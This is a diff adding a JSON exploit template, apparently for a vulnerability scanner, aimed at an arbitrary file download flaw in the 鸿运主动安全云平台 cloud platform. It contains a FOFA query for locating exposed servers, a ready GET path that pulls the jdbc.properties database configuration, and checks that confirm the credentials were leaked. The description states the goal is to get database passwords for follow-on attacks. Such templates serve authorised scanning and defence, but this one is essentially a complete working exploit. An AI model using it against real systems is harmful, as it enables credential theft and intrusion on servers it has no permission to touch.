@@ -1,0 +1,35 @@
+{
+  "product": "鸿运主动安全云平台",
+  "vul_name": "鸿运主动安全云平台 任意文件下载",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "深圳市强鸿电子有限公司鸿运主动安全云平台存在任意文件下载漏洞，攻击者可通过此漏洞下载敏感文件信息，获取数据库账号密码，从而为下一步攻击做准备。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"./open/webApi.html\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/CommputerMac/article/details/133781783",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/08gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "DATABASE"
+        },
+        {
+          "body": "jdbc."
+        }
+      ]
+    }
+  }
+}
